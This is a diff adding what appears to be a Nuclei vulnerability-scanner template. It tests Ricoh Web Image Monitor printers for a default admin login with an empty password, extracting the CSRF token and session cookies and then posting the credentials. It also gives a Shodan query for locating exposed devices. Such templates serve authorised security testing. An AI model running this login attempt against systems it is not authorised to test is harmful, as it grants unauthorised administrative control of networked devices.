@@ -1,0 +1,72 @@
+id: ricoh-webimagemonitor-default-login
+
+info:
+  name: Ricoh Web Image Monitor - Default Login
+  author: mr-pmillz
+  severity: high
+  description: |
+    Ricoh Web Image Monitor may retain its default administrator account with username admin and an empty password.
+    This template submits these credentials after retrieving the login form's token and session cookies.
+  impact: |
+    An attacker can access the printer's administrative interface and modify device and network settings.
+  remediation: |
+    Set a unique password for the administrator account and restrict Web Image Monitor access to trusted management hosts.
+  reference:
+    - https://support.ricoh.com/bb_v1oi/pub_e/oi_view/0001046/0001046097/view/op_guide/int/0123.htm
+  classification:
+    cwe-id: CWE-1392
+  metadata:
+    vendor: ricoh
+    product: web_image_monitor
+    shodan-query: 'http.html:"Web Image Monitor"'
+  tags: default-login,ricoh,printer,intrusive
+
+flow: http(1) && http(2)
+
+variables:
+  username: admin
+  password: ""
+
+http:
+  - raw:
+      - |
+        GET /web/guest/en/websys/webArch/authForm.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: cookieOnOffChecker=on
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        group: 1
+        part: body
+        internal: true
+        regex:
+          - '<input\stype="hidden"\sname="wimToken"\svalue="([[:alnum:]]{9,10})">'
+
+      - type: kval
+        name: risession
+        internal: true
+        part: header
+        kval:
+          - risessionid
+      - type: kval
+        name: wisession
+        internal: true
+        part: header
+        kval:
+          - wimsesid
+
+  - raw:
+      - |
+        POST /web/guest/en/websys/webArch/login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: risessionid={{risession}}; wimsesid={{wisession}};
+        Content-Type: application/x-www-form-urlencoded
+        Referer: https://{{Hostname}}/web/guest/en/websys/webArch/authForm.cgi
+
+        wimToken={{csrf_token}}&userid_work=&userid={{url_encode(base64(username))}}&password_work=&password={{url_encode(base64(password))}}&open=
+
+    matchers:
+      - type: status
+        status:
+          - 302
